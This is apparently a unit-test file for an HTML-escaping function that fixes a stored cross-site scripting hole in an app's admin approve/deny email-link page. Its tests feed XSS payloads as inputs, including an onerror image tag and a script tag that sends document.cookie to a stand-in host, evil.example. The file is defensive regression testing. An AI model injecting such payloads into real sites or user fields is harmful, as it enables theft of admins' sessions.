import { describe, it, expect } from "vitest";
import { escapeHtml } from "./admin-approval-api";

/**
 * The one-click approve/deny email links render a result page whose message is built
 * from `user.name` / `user.email` — set at signup with only `z.string().min(1)`
 * validation — and interpolated straight into `<p>${message}</p>` with no escaping.
 * Confirmed live: a user signed up with the name `<img src=x onerror=alert(1)>` had it
 * stored and echoed back verbatim by admin.getPendingUsers. Whoever clicks the
 * approve/deny link from their email — normally an admin — runs that markup in their
 * own browser, in their own session. This is the string-escaping half of the fix,
 * unit-tested directly since exercising the real Express routes end to end would need
 * a running server and mocked mail delivery for comparatively little extra assurance
 * over testing the escaping function itself.
 */
describe("escapeHtml", () => {
  it("neutralizes the exact payload confirmed live against signup's name field", () => {
    // The attribute text ("onerror=alert(...)") staying in the escaped output is
    // fine and expected — it's inert once `<` and `>` can no longer form a real tag.
    // What matters is that no live element can be parsed out of it.
    const payload = "<img src=x onerror=alert(document.domain)>";
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain("<img");
    expect(escaped).not.toContain(">");
    expect(escaped).toBe("&lt;img src=x onerror=alert(document.domain)&gt;");
  });

  it("escapes every HTML-significant character", () => {
    expect(escapeHtml(`&<>"'`)).toBe("&amp;&lt;&gt;&quot;&#39;");
  });

  it("leaves ordinary names and emails unchanged", () => {
    expect(escapeHtml("Jordan Bailey")).toBe("Jordan Bailey");
    expect(escapeHtml("jordan.bailey@demo.example.com")).toBe("jordan.bailey@demo.example.com");
  });

  it("closes a script tag injection attempt", () => {
    const payload = `</p><script>fetch('https://evil.example/steal?c='+document.cookie)</script>`;
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain("<script>");
    expect(escaped).not.toContain("</p>");
  });
});
